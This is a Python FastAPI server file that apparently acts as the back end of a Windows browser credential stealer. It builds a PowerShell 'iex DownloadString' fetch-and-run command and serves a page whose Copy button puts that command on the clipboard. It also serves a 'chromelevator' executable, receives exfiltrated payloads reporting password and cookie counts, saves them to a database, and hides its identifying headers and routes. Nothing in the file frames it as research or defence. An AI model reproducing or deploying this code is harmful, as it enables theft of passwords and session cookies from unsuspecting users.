import json
import logging
import os
from pathlib import Path
from typing import Any

from fastapi import FastAPI, Request
from fastapi.exceptions import RequestValidationError
from fastapi.responses import FileResponse, HTMLResponse, PlainTextResponse
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.responses import Response

from app.repository import save_payload_record, verify_database_connection

logger = logging.getLogger(__name__)

app = FastAPI(
    title="",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)


@app.on_event("startup")
async def startup_verify_database() -> None:
    try:
        verify_database_connection()
        logger.info("Database connection OK")
    except Exception:
        logger.exception("Database connection failed at startup")

SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
BIN_DIR = Path(__file__).with_name("bin")

EMPTY = Response(status_code=404, content=b"")


@app.middleware("http")
async def strip_identifying_headers(request: Request, call_next) -> Response:
    response = await call_next(request)
    if "server" in response.headers:
        del response.headers["server"]
    return response


@app.exception_handler(StarletteHTTPException)
async def silent_http_exception(_request: Request, _exc: StarletteHTTPException) -> Response:
    return Response(status_code=_exc.status_code, content=b"")


@app.exception_handler(RequestValidationError)
async def silent_validation_exception(_request: Request, _exc: RequestValidationError) -> Response:
    return EMPTY


def resolve_api_base(request: Request | None = None) -> str:
    if host := os.getenv("PAYLOAD_HOSTNAME"):
        scheme = "https" if host.endswith(".fly.dev") else "http"
        return f"{scheme}://{host}"

    if request is not None:
        return f"{request.url.scheme}://{request.url.netloc}"

    if fly_app := os.getenv("FLY_APP_NAME"):
        return f"https://{fly_app}.fly.dev"

    return "http://localhost:8001"


API_BASE = resolve_api_base()
PAYLOAD_URL = f"{API_BASE}/payload"


def build_powershell_command(api_base: str | None = None) -> str:
    base = api_base or API_BASE
    return f"iex (New-Object Net.WebClient).DownloadString('{base}/windows-script')"


def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
    return save_payload_record(payload)


def render_windows_script() -> str:
    return (
        SCRIPT_PATH.read_text(encoding="utf-8")
        .replace("__API_BASE__", API_BASE)
        .replace("__PAYLOAD_URL__", PAYLOAD_URL)
    )


@app.get("/windows-script", response_class=PlainTextResponse)
async def get_windows_script() -> PlainTextResponse:
    return PlainTextResponse(
        render_windows_script(),
        media_type="text/plain; charset=utf-8",
    )


@app.get("/c", response_class=HTMLResponse)
async def copy_command(request: Request) -> HTMLResponse:
    api_base = resolve_api_base(request)
    command = build_powershell_command(api_base)

    return HTMLResponse(
        f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Copy</title>
  <style>
    body {{
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 0.75rem;
      min-height: 100vh;
      margin: 0;
    }}
    button {{
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      cursor: pointer;
    }}
    #status {{
      color: #16a34a;
      min-height: 1.25rem;
    }}
  </style>
</head>
<body>
  <button type="button" id="copy-btn">Copy</button>
  <div id="status"></div>
  <script>
    const command = {json.dumps(command)};
    document.getElementById("copy-btn").addEventListener("click", async () => {{
      const status = document.getElementById("status");
      try {{
        await navigator.clipboard.writeText(command);
        status.textContent = "Copied";
      }} catch (e) {{
        const textarea = document.createElement("textarea");
        textarea.value = command;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        if (document.execCommand("copy")) {{
          status.textContent = "Copied";
        }} else {{
          status.textContent = "Could not copy";
        }}
        textarea.remove();
      }}
    }});
  </script>
</body>
</html>"""
    )


@app.get("/chromelevator", response_model=None)
async def get_chromelevator(arch: str = "x64"):
    arch = arch.lower()
    if arch not in {"x64", "arm64"}:
        return EMPTY

    binary_path = BIN_DIR / f"chromelevator_{arch}.exe"
    if not binary_path.is_file():
        return EMPTY

    return FileResponse(
        binary_path,
        media_type="application/octet-stream",
        filename="chromelevator.exe",
    )


@app.post("/payload")
async def receive_payload(request: Request) -> dict[str, Any]:
    payload = await request.json()
    saved = save_payload(payload)

    chromelevator = payload.get("chromelevator") if isinstance(payload.get("chromelevator"), dict) else {}

    return {
        "received": True,
        "password_count": payload.get("passwordCount", 0),
        "cookie_count": payload.get("cookieCount", 0),
        "chromelevator": chromelevator,
        "saved": saved,
    }


@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
async def unknown_route(_full_path: str) -> Response:
    return EMPTY
